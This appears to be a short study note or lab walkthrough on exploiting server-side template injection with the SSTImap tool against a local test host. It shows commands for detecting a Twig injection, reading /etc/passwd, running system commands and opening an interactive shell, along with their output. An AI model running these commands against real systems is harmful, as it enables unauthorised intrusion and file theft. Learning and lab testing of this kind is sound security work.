---
title: e-SSTImap
draft: false
tags:
  - sstimap
---
## Installation

```shell-session
[!bash!]$ git clone https://github.com/vladko312/SSTImap

[!bash!]$ cd SSTImap

[!bash!]$ pip3 install -r requirements.txt
```

## Exploit

```shell-session
[!bash!]$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test

<SNIP>

[+] SSTImap identified the following injection point:

  Query parameter: name
  Engine: Twig
  Injection: *
  Context: text
  OS: Linux
  Technique: render
  Capabilities:
    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, php code
```

To download a remote file to our local machine, we can use `-D` flag:

```shell-session
[!bash!]$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'

<SNIP>

[+] File downloaded correctly
```

Additionally, we can execute a system command using the `-S` flag:

```shell-session
[!bash!]$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id

<SNIP>

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Alternatively, we can use `--os-shell` to obtain an interactive shell:

```shell-session
[!bash!]$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell

<SNIP>

[+] Run commands on the operating system.
Linux $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Linux $ whoami
www-data
```

